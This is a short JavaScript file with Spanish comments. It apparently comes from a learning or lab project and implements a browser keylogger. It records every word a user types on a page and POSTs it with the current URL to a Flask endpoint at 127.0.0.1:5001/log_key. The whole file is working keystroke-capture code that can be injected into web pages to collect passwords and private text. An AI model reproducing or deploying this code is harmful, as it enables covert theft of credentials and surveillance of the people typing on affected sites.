let currentWord = '';  // Variable para almacenar la palabra en construcción

document.addEventListener('keydown', function(event) {
    let key = event.key;  // Captura la tecla presionada
    let currentUrl = window.location.href;  // Captura la URL actual

    // Verifica si la tecla es una letra o número
    if (/[a-zA-Z0-9]/.test(key)) {
        currentWord += key;  // Añadir la letra o número a la palabra actual
    }

    // Si se presiona "Espacio" o "Enter", se considera que la palabra está completa
    if (key === ' ' || key === 'Enter') {
        if (currentWord.length > 0) {
            console.log('Informacion registrada:', currentWord);
            console.log('URL actual:', currentUrl);

            // Envía la palabra y la URL al servidor Flask utilizando POST
            fetch('http://127.0.0.1:5001/log_key', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ word: currentWord, url: currentUrl })  // Enviamos la palabra y la URL como JSON
            })
            .then(response => response.json())
            .then(data => console.log('Respuesta del servidor:', data))
            .catch((error) => console.error('Error:', error));

            currentWord = '';  // Reinicia la palabra después de enviarla
        }
    }
});


